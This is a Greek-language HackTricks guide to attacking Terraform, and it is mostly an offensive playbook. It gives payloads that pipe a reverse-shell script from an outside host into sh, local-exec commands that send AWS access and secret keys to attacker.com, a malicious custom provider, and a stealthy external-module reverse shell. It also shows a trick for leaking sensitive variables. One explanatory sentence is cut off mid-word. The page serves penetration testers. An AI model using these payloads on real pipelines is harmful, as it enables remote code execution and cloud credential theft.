# Ασφάλεια του Terraform

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

[Από τα έγγραφα: ](https://developer.hashicorp.com/terraform/intro)

Το HashiCorp Terraform είναι ένα εργαλείο **υποδομής ως κώδικα** που σας επιτρέπει να ορίσετε τόσο **πόρους στο cloud όσο και on-prem** σε ανθρωποαναγνώσιμα αρχεία διαμόρφωσης που μπορείτε να εκδόσετε, να επαναχρησιμοποιήσετε και να μοιραστείτε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε ένα συνεπές ροή εργασίας για να παρέχετε και να διαχειρίζεστε όλη την υποδομή σας κατά τη διάρκεια του κύκλου ζωής της. Το Terraform μπορεί να διαχειριστεί συστατικά χαμηλού επιπέδου όπως υπολογιστικούς πόρους, αποθήκευση και πόρους δικτύωσης, καθώς και συστατικά υψηλού επιπέδου όπως καταχωρήσεις DNS και λειτουργίες SaaS.

### Πώς λειτουργεί το Terraform;

Το Terraform δημιουργεί και διαχειρίζεται πόρους σε πλατφόρμες cloud και άλλες υπηρεσίες μέσω των διεπαφών προγραμματισμού εφαρμογών (APIs) τους. Οι παροχείς επιτρέπουν στο Terraform να λειτουργεί με σχεδόν οποιαδήποτε πλατφόρμα ή υπηρεσία με προσβάσιμο API.

![](<../.gitbook/assets/image (33).png>)

Η HashiCorp και η κοινότητα του Terraform έχουν ήδη γράψει **περισσότερους από 1700 παροχείς** για τη διαχείριση χιλιάδων διαφορετικών τύπων πόρων και υπηρεσιών, και αυτός ο αριθμός συνεχίζει να αυξάνεται. Μπορείτε να βρείτε όλους τους δημόσια διαθέσιμους παροχείς στο [Terraform Registry](https://registry.terraform.io/), συμπεριλαμβανομένων των Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog και πολλών άλλων.

Η βασική ροή εργασίας του Terraform αποτελείται από τρεις στάδια:

* **Εγγραφή:** Ορίζετε πόρους, οι οποίοι μπορεί να βρίσκονται σε πολλαπλούς παρόχους cloud και υπηρεσίες. Για παράδειγμα, μπορείτε να δημιουργήσετε μια διαμόρφωση για να αναπτύξετε μια εφαρμογή σε εικονικές μηχανές σε ένα δίκτυο Virtual Private Cloud (VPC) με ομάδες ασφαλείας και έναν ισορροπητή φορτίου.
* **Σχεδιασμός:** Το Terraform δημιουργεί ένα σχέδιο εκτέλεσης που περιγράφει την υποδομή που θα δημιουργήσει, ενημερώσει ή καταστρέψει με βάση την υπάρχουσα υποδομή και τη διαμόρφωσή σας.
* **Εφαρμογή:** Μετά από έγκριση, το Terraform εκτελεί τις προτεινόμενες λειτουργίες με τη σωστή σειρά, σεβόμενο τυχόν εξαρτήσεις πόρων. Για παράδειγμα, εάν ενημερώσετε τις ιδιότητες ενός VPC και αλλάξετε τον αριθμό των εικονικών μηχανών σε αυτό το VPC, το Terraform θα δημιουργήσει ξανά το VPC πριν αλλάξει τον αριθμό των εικονικών μηχανών.

![](<../.gitbook/assets/image (81).png>)

## Εργαστήριο Terraform

Απλά εγκαταστήστε το terraform στον υπολογιστή σας.

Εδώ έχετε έναν [οδηγό](https://learn.hashicorp.com/tutorials/terraform/install-cli) και εδώ έχετε τον [καλύτερο τρόπο για να κατεβάσετε το terraform](https://www.terraform.io/downloads).

## RCE στο Terraform

Το Terraform **δεν έχει μια πλατφόρμα που εκθέτει μια ιστοσελίδα ή μια δικτυακή υπηρεσία** που μπορούμε να απαριθμήσουμε, επομένως, ο μ
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Χρήση προσαρμοσμένου παροχέα

Ένας επιτιθέμενος μπορεί να στείλει έναν [προσαρμοσμένο παροχέα](https://learn.hashicorp.com/tutorials/terraform/provider-setup) στο [Κατάλογο του Terraform](https://registry.terraform.io/) και στη συνέχεια να τον προσθέσει στον κώδικα του Terraform σε ένα feature branch ([παράδειγμα από εδώ](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Ο πάροχος κατεβάζεται στο `init` και θα εκτελέσει το κακόβουλο κώδικα όταν εκτελεστεί το `plan`.

Μπορείτε να βρείτε ένα παράδειγμα στο [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Χρήση εξωτερικής αναφοράς

Και οι δύο αναφερόμενες επιλογές είναι χρήσιμες, αλλά όχι πολύ αόρατες (η δεύτερη είναι πιο αόρατη, αλλά πιο περίπλοκη από την πρώτη). Μπορείτε να πραγματοποιήσετε αυτήν την επίθεση ακόμα και με έναν **πιο αόρατο τρόπο**, ακολουθώντας αυτές τις προτάσεις:

* Αντί να προσθέσετε το αντίστροφο κέλυφος (rev shell) απευθείας στο αρχείο terraform, μπορείτε να **φορτώσετε έναν εξωτερικό πόρο** που περιέχει το αντίστροφο κέλυφος (rev shell):
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Μπορείτε να βρείτε τον κώδικα του αντιστρόφου κελύφους στο [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Στο εξωτερικό πόρο, χρησιμοποιήστε το χαρακτηριστικό **ref** για να κρύψετε τον **κώδικα του αντιστρόφου κελύφους του terraform σε ένα κλαδί** μέσα στο αποθετήριο, κάτι σαν αυτό: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Εφαρμογή Terraform

Η εφαρμογή του Terraform θα εκτελεστεί για να εφαρμοστούν όλες οι αλλαγές, μπορείτε επίσης να το καταχραστείτε για να λάβετε RCE εισάγοντας **ένα κακόβουλο αρχείο Terraform με** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Απλά πρέπει να βεβαιωθείτε ότι κάποιο φορτίο όπως τα παρακάτω τελειώνει στο αρχείο `main.tf`.
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ακολουθήστε τις **προτάσεις από την προηγούμενη τεχνική** για να εκτελέσετε αυτήν την επίθεση με έναν **πιο αόρατο τρόπο χρησιμοποιώντας εξωτερικές αναφορές**.

## Απορροφημένες Μυστικές

Μπορείτε να έχετε **απορροφημένες τιμές που χρησιμοποιούνται από το terraform να διαρρέουν** εκτελώντας την εντολή `terraform apply` προσθέτοντας στο αρχείο terraform κάτι σαν:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Εργαλεία Ελέγχου

* [**tfsec**](https://github.com/aquasecurity/tfsec): Το tfsec χρησιμοποιεί στατική ανάλυση του κώδικα terraform για να εντοπίσει πιθανές λανθασμένες ρυθμίσεις.
* [**terascan**](https://github.com/tenable/terrascan): Το Terrascan είναι ένας αναλυτής κώδικα για το Infrastructure as Code.

## Αναφορές

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
